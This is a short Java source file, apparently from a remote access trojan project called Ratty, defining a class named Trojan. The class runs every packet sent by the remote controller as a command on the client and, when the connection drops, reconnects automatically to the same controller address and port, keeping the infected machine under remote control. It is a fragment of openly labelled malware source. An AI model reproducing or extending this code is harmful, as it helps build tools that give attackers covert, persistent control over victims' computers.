package de.sogomn.rat;

import de.sogomn.rat.packet.IPacket;

public final class Trojan implements IClientObserver {
	
	public Trojan() {
		//...
	}
	
	@Override
	public void packetReceived(final ActiveClient client, final IPacket packet) {
		packet.execute(client);
	}
	
	@Override
	public void disconnected(final ActiveClient client) {
		final String address = client.getAddress();
		final int port = client.getPort();
		
		client.setObserver(null);
		
		Ratty.connectToHost(address, port);
	}
	
}
